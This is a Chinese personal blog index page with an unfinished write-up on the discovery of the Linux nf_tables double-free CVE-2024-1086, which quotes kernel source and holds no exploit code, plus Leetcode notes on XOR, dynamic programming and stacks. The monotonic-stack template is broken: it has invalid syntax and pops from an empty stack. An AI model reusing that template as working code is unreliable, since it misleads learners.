<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> SerArcher&#39;s Blog</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    <link rel="alternate" href="/atom.xml" title="SerArcher's Blog" type="application/atom+xml">
</head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      
<section class="cover">
    
      
      <a class="forkMe" href="https://github.com/Shen-Yu/hexo-theme-ayer"
        target="_blank"><img width="149" height="149" src="/images/forkme.png"
          class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">SerArcher&#39;s Blog</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['人生如逆旅，我亦是行人', '每一次尝试都是一笔投资', ''],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  <ul class="ads">
    
        <li>
            <a href="">
                <img src="" width="" alt="">
            </a>
        </li>
    
        <li>
            <a href="">
                <img src="" width="" alt="">
            </a>
        </li>
    
</ul>
  
  
  
<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content">这里不知道写点啥，但是不写点啥又光秃秃的，需要打广告的可以找我:)</div>
</div>


<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-hello-world"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2024/03/07/hello-world/"
    >前言
  <i class="article-topping">置顶</i>
</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/03/07/hello-world/" class="article-date">
  <time datetime="2024-03-07T04:48:07.808Z" itemprop="datePublished">2024-03-07</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>记录、积累、反思、回顾</p>
<p>May this blog help you.</p>
<p>欢迎交流：<a href="mailto:&#121;&#x79;&#x7a;&#104;&#x75;&#46;&#x72;&#x79;&#x61;&#x6e;&#x40;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#121;&#x79;&#x7a;&#104;&#x75;&#46;&#x72;&#x79;&#x61;&#x6e;&#x40;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-漏洞分析-CVE-2024-1086"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2024/04/07/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2024-1086/"
    >漏洞分析-CVE-2024-1086</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/04/07/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2024-1086/" class="article-date">
  <time datetime="2024-04-07T04:41:23.000Z" itemprop="datePublished">2024-04-07</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="CVE-2024-1086-Double-Free-in-nf-tables"><a href="#CVE-2024-1086-Double-Free-in-nf-tables" class="headerlink" title="CVE-2024-1086 Double Free in nf_tables"></a>CVE-2024-1086 Double Free in nf_tables</h1><p>这个漏洞的根因其实还是非常容易理解的——主要是内核代码里没有校验参数，导致用户可以利用。但是通读了原作者的分析文章，发现作者详细描述了其发现漏洞的思路，这对我们做内核的测试和漏洞挖掘都有一些较深启示。此外，作者也利用了Dirty pagetable这一较新的漏洞利用方法，值得一探究竟。</p>
<p>探究过内核的人都知道内核的代码量之大，架构之复杂是令人惊叹的。因此本文也会对与本漏洞相关的内核概念做一些介绍，而那些在网上可以直接搜到的非技术类信息，本文则不多赘述。</p>
<p>作者的原文在这里：<a target="_blank" rel="noopener" href="https://pwning.tech/nftables/#3-the-bug%EF%BC%8C%E6%84%9F%E5%85%B4%E8%B6%A3%E7%9A%84%E5%8F%AF%E4%BB%A5%E8%87%AA%E8%A1%8C%E9%98%85%E8%AF%BB%E3%80%82">https://pwning.tech/nftables/#3-the-bug，感兴趣的可以自行阅读。</a></p>
<h2 id="1-漏洞发现"><a href="#1-漏洞发现" class="headerlink" title="1. 漏洞发现"></a>1. 漏洞发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">It all started when I wanted to implement firewall bypasses into my ORB rootkit Netkit. I wanted to rely on the kernel API (exported functions) for any actions, as it would have the same compatibility as regular kernel modules. Hopefully, this would mean that the rootkit kernel module could be used across architectures and kernel versions, without having to change the source code.</span><br><span class="line">...</span><br><span class="line">While reading nf_tables code - whose state machine is very interesting from a software development point of view - I noticed the nf_hook_slow() function. This function loops over all rules in a chain and stops evaluation (returns the function) immediately when NF_DROP is issued.</span><br></pre></td></tr></table></figure>

<p>作者是为了实现其工具，用到了netfilter相关的技术，才开始研究的这块技术。而此前作者和我们一样，也对此领域一无所知。当作者通读了源码之后发现了这个<em>nf_hook_slow()<em>这个函数会循环遍历每一条存在的规则。而在</em>NF_DROP</em>条件下，其返回值<em>ret</em>是取决于<em>verdict</em>的，而通过进一步对<em>verdict</em>的分析，作者又发现其值是可以被用户控制的。因此作者就抱着试一试的心态，将<em>NF_DROP</em>下的返回值<em>ret</em>设置为<em>NF_ACCEPT</em>，看看内核是否会发生什么异常。结果，作者发现了一堆panic的错误，经过分析，发现了double-free的问题。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// looping over existing rules when skb triggers chain</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">nf_hook_slow</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="keyword">struct</span> nf_hook_state *state,</span></span><br><span class="line"><span class="params">		 <span class="type">const</span> <span class="keyword">struct</span> nf_hook_entries *e, <span class="type">unsigned</span> <span class="type">int</span> s)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> verdict;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line">	<span class="keyword">for</span> (; s &lt; e-&gt;num_hook_entries; s++) &#123;</span><br><span class="line">		verdict = nf_hook_entry_hookfn(&amp;e-&gt;hooks[s], skb, state);</span><br><span class="line">		<span class="keyword">switch</span> (verdict &amp; NF_VERDICT_MASK) &#123;</span><br><span class="line">		<span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> NF_DROP:</span><br><span class="line">			kfree_skb_reason(skb, SKB_DROP_REASON_NETFILTER_DROP);</span><br><span class="line">			ret = NF_DROP_GETERR(verdict);</span><br><span class="line">			<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">				ret = -EPERM;</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			WARN_ON_ONCE(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个问题的整体发现思路其实是：<strong>1. 作者想实现工具 ——&gt; 2. 学习Netfilter知识 ——&gt; 3. 找到相关内核函数进行分析 ——&gt; 4. 发现可能漏洞点并尝试测试 ——&gt; 5. 系统panic ——&gt; 6. 进一步分析 ——&gt; 7. 发现double free问题 ——&gt; 8. 尝试漏洞利用</strong>。</p>
<p>我自己反思了一下，如果是我做工具的实现，可能卡在第4步就不会继续往下走了——即使发现了可能存在的漏洞点也不会尝试。又或者简单尝试了一下之后发现系统panic，也不去做进一步的分析了。</p>
<p>当然作为测试，我们可能也往往做到第5步就当完成了任务，提单然后交给开发分析解决，不会去想怎么进一步利用。 因为利用更加考察平时对技术的积累和技术熟练度。而作为安全从业人员，其与测试人员的区别往往就在于是否具备后者的能力。</p>
<p>TBD</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-leetcode-xor"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2024/04/04/leetcode-xor/"
    >Leetcode笔记9 - 位运算</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/04/04/leetcode-xor/" class="article-date">
  <time datetime="2024-04-04T14:59:01.000Z" itemprop="datePublished">2024-04-04</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/">Leetcode算法笔记</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Leetcode笔记9-位运算"><a href="#Leetcode笔记9-位运算" class="headerlink" title="Leetcode笔记9 - 位运算"></a>Leetcode笔记9 - 位运算</h1><p><strong>核心知识点：</strong></p>
<ul>
<li>任何数和0做异或运算，都为原来的数</li>
<li>任何数和自己做异或运算，都为0</li>
<li>异或运算满足结合律和交换律</li>
</ul>
<h2 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136. 只出现一次的数字"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/single-number/">136. 只出现一次的数字</a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 给你一个 非空 整数数组 nums ，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</span></span><br><span class="line"><span class="comment"># 你必须设计并实现线性时间复杂度的算法来解决此问题，且该算法只使用常量额外空间。</span></span><br><span class="line"><span class="comment"># 输入：nums = [2,2,1]</span></span><br><span class="line"><span class="comment"># 输出：1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">singleNumber</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ans = nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(nums)):</span><br><span class="line">            ans = ans ^ nums[i]</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/" rel="tag">Leetcode算法笔记</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-leetcode-dp2"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2024/03/31/leetcode-dp2/"
    >Leetcode笔记8 - 二维动态规划总结</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/03/31/leetcode-dp2/" class="article-date">
  <time datetime="2024-03-31T13:57:10.000Z" itemprop="datePublished">2024-03-31</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/">Leetcode算法笔记</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Leetcode笔记8-二维动态规划"><a href="#Leetcode笔记8-二维动态规划" class="headerlink" title="Leetcode笔记8 - 二维动态规划"></a>Leetcode笔记8 - 二维动态规划</h1><p><strong>核心思路</strong></p>
<ul>
<li>确定状态，即问题的变量</li>
<li>确定dp方程 —— 需要考虑dp[0][0], dp[i][0], dp[0][j] 的所有情况 </li>
<li>采用自底向上 &#x2F; 自顶向下的解法</li>
</ul>
<h2 id="64-最小路径和"><a href="#64-最小路径和" class="headerlink" title="64. 最小路径和"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/minimum-path-sum/">64. 最小路径和</a></h2><p>第一步先将dp[0][0], dp[i][0], dp[0][j] 确定，然后下面自然开始考虑dp[1][1]的情况。很显然，**dp[1][1] &#x3D; min( dp[0][1] , dp[1][0] ) + grid[1][1]**。</p>
<p><img src="https://assets.leetcode-cn.com/solution-static/64/9.png"></p>
<p>对于任意的dp[i][j]，我们发现，由于<strong>只有两个方向能到达</strong>，因此**dp[i][j] &#x3D; min(dp[i-1][j], dp[i][j-1]) + grid[i][j] **。</p>
<p><img src="https://assets.leetcode-cn.com/solution-static/64/17.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 给定一个包含非负整数的 m x n 网格 grid ，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。</span></span><br><span class="line"><span class="comment">## dp[i][0] = dp[i-1][0] + grid[i][0]</span></span><br><span class="line"><span class="comment">## dp[0][j] = dp[0][j-1] + grid[0][j-1]</span></span><br><span class="line"><span class="comment">## dp[i][j] = min(dp[i-1][j], dp[i][j-1]) + grid[i][j]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minPathSum</span>(<span class="params">self, grid: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> grid <span class="keyword">or</span> <span class="keyword">not</span> grid[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        rows, cols = <span class="built_in">len</span>(grid), <span class="built_in">len</span>(grid[<span class="number">0</span>])</span><br><span class="line">        dp = [[<span class="number">0</span>] * cols <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rows)]</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rows):</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i-<span class="number">1</span>][<span class="number">0</span>] + grid[i][<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, cols):</span><br><span class="line">            dp[<span class="number">0</span>][j] = dp[<span class="number">0</span>][j-<span class="number">1</span>] + grid[<span class="number">0</span>][j]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rows):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, cols):</span><br><span class="line">                dp[i][j] = <span class="built_in">min</span>(dp[i-<span class="number">1</span>][j], dp[i][j-<span class="number">1</span>]) + grid[i][j]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dp[rows-<span class="number">1</span>][cols-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="62-不同路径"><a href="#62-不同路径" class="headerlink" title="62. 不同路径"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/unique-paths/">62. 不同路径</a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为 “Start” ）。</span></span><br><span class="line"><span class="comment"># 机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。</span></span><br><span class="line"><span class="comment"># 问总共有多少条不同的路径？</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dp[i][0] = 1</span></span><br><span class="line"><span class="comment"># dp[0][j] = 1</span></span><br><span class="line"><span class="comment"># dp[i][j] = dp[i-1][j] + dp[i][j-1]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dp[1][0] = 1</span></span><br><span class="line"><span class="comment"># dp[0][1] = 1</span></span><br><span class="line"><span class="comment"># dp[1][1] = dp[1][0] + dp[0][1] = 1 + 1 = 2</span></span><br><span class="line"><span class="comment"># dp[1][2] = dp[1][1] + dp[0][2] = 2 + 1 = 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">uniquePaths</span>(<span class="params">self, m: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        dp = [[<span class="number">0</span>] * n] * m</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            dp[<span class="number">0</span>][j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, m):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">                dp[i][j] = dp[i][j-<span class="number">1</span>] + dp[i-<span class="number">1</span>][j]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dp[m-<span class="number">1</span>][n-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/" rel="tag">Leetcode算法笔记</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-leetcode-stack"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2024/03/22/leetcode-stack/"
    >Leetcode笔记7 - 栈结构总结</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/03/22/leetcode-stack/" class="article-date">
  <time datetime="2024-03-22T05:32:02.000Z" itemprop="datePublished">2024-03-22</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/">Leetcode算法笔记</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Leetcode笔记7-栈结构总结"><a href="#Leetcode笔记7-栈结构总结" class="headerlink" title="Leetcode笔记7 - 栈结构总结"></a>Leetcode笔记7 - 栈结构总结</h1><p>栈的特点是：先进后出，后进先出。</p>
<p>遇到需要先进后出的题，优先考虑栈结构。例如：匹配括号等。</p>
<h2 id="1-辅助栈"><a href="#1-辅助栈" class="headerlink" title="1. 辅助栈"></a>1. 辅助栈</h2><h3 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/valid-parentheses/">20. 有效的括号</a></h3><p>这里需要考虑合法括号的特点是啥：</p>
<p>例如 () [] {}都是合法括号， (())也是合法括号，但是如果认为左括号和右括号数量相等就为合法括号，是错误的，因为：(([))]也不合法</p>
<p>(([))] 不合法的原因是： [的右边跟上了一个右小括号），但是如果[的右边跟上的是一个左小括号(，那么括号可能是合法的，因为：(([()]))</p>
<p>所以合法括号的特点是：</p>
<ul>
<li>左右括号数量相等</li>
<li>左括号的右边不能紧跟着非同类的右括号</li>
</ul>
<p>但是这样考虑太复杂了，我们需要换个角度考虑，从括号闭合的角度思考：<strong>当括号内部没有子括号，或者括号内部的子括号全部闭合时，我们认为括号合法</strong>。</p>
<p>因此，<strong>最里面的括号需要先闭合</strong> —— 可是一个数组里，我们往往是按顺序遍历数组的，如果最里面的括号需要闭合，意味着我们需要考虑栈，因为栈是先进后出，后进先出的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：s = &quot;()&quot;</span></span><br><span class="line"><span class="comment"># 输出：true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入：s = &quot;(]&quot;</span></span><br><span class="line"><span class="comment"># 输出：false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">## ([&#123;&#125;()])</span></span><br><span class="line">        stack = [<span class="string">&#x27;?&#x27;</span>]</span><br><span class="line">        hashmap = &#123;<span class="string">&#x27;(&#x27;</span>:<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>:<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>:<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;?&#x27;</span>:<span class="string">&#x27;?&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">in</span> hashmap: stack.append(c)</span><br><span class="line">            <span class="keyword">elif</span> c != hashmap[stack.pop()]: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="built_in">len</span>(stack) == <span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>



<h2 id="2-单调栈"><a href="#2-单调栈" class="headerlink" title="2. 单调栈"></a>2. 单调栈</h2><p>单调栈是用来解决“<strong>下一个更大</strong>”类型的题目。</p>
<p>一个数组，要求你找到每个元素对应的下一个更大的元素。</p>
<p><strong>核心思路：</strong></p>
<ul>
<li>思考这样一个数组[5,4,1,2,3,4,5,6]，从后往前思考，nums[1]&#x3D;4的下一个更大元素是nums[6]&#x3D;5，而nums[0]&#x3D;5的下一个最大元素是nums[7]&#x3D;6</li>
<li>实际上在考虑nums[1] 的下一个最大元素为nums[6]的时候，nums[1]已经和nums[2], nums[3], num[4], nums[5]做过比较了 —— nums[1] 比它们都大</li>
<li>因此继续考虑nums[0]的时候，nums[2], nums[3], nums[4], nums[5]都不必再考虑了，只需比较它和nums[1]，由于nums[0] &gt; nums[1]，因此下一个直接比较nums[0]和nums[6]就好了，栈里的其他元素都要pop掉。</li>
</ul>
<p><strong>模板：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数组： nums = [4,1,2,3,4,5]</span></span><br><span class="line">size = <span class="built_in">len</span>(nums)</span><br><span class="line">stack = []</span><br><span class="line">keep = <span class="built_in">dict</span>&#123;&#125;</span><br><span class="line"><span class="comment"># 从后往前遍历 + 从后往前入栈</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># 如果栈为空，或者当前的元素比栈顶元素大的话，把栈顶元素pop出来，直到找到不比当前元素大的，或者直到栈为空</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stack <span class="keyword">or</span> nums[i] &gt; stack[-<span class="number">1</span>]:</span><br><span class="line">        stack.pop()</span><br><span class="line">    <span class="comment"># 这个时候记录一下当前元素的下一个最大值</span></span><br><span class="line">    keep[nums[i]] = stack[-<span class="number">1</span>] <span class="keyword">if</span> stack <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">    <span class="comment"># 把数组元素从后往前入栈</span></span><br><span class="line">    stack.append(nums[i])</span><br></pre></td></tr></table></figure>



